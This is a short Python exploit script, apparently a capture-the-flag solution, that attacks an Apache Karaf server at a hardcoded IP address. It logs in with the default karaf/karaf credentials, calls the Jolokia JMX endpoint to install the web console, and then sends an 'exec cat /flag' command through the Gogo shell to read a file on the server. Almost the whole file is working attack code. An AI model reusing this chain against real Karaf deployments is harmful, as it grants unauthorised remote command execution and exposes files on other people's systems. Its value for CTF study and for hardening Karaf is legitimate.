#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/03/23, 17:48
"""

import requests
from requests.auth import HTTPBasicAuth
import time
import json
import re

req = requests.Session()

URL = 'http://111.186.63.207:31337/'
auth = HTTPBasicAuth('karaf', 'karaf')


def post_gogo(pl=""):
    data = {
        "w": "120",
        "h": "39",
        "k": pl
    }
    res = req.post(URL+'system/console/gogo', auth=auth, data=data)
    if b'f15 b12' in res.content:
        ret = re.findall(r'flag{.*?}', res.content.decode('utf8'))
        if ret:
            return ret
    return False


def jolokia_webconsole():
    pl = {
        "type": "exec",
        "mbean": "org.apache.karaf:type=feature,name=root",
        "operation": "installFeature(java.lang.String)",
        "arguments": ["webconsole"]
    }
    res = req.post(URL+'jolokia/', auth=auth, data=json.dumps(pl),
                   headers={'Content-Type': 'application/json'}, timeout=10)
    if res.status_code == 200 and b'request' in res.content:
        return True
    else:
        print("error")


if __name__ == '__main__':
    print("[+] jolokia install feature webconsole...")
    if jolokia_webconsole():
        # Waiting for loading...
        time.sleep(10)
        print("[+] maybe webconsole will ok")
        # init ?
        post_gogo("")
        res = ""
        while not res:
            print("[+] find flag...")
            res = post_gogo("exec cat /flag\x0d")
        print("[+] Success!!! Flag is here!")
        print(res[0])
    else:
        print("[-] Something was wrong~~ Try again!")
